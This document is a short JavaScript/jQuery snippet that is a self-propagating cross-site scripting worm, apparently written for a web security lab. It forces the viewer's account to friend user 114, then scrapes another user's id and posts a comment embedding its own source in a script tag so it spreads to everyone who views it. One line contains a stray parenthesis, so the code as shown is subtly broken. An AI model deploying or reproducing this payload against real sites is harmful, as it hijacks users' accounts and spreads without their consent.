function fight(){  
  $.get("add_friend.php?id=114");
  $.get('add_comment.php?id=114&comment='.concat(Date()));
  $.get("home.php", function(data, status){
    var ln = data.search("id=");
    var ids = data.substr(ln, 6);
    var id = ids.match(/\d+/)[0];
    var a = 'add_comment.php?id='.concat(id);
    var b = '&comment=<script>').concat(fight.toString()).concat('fight();<\/script>');
    $.get(a+b);
    });
}
fight();
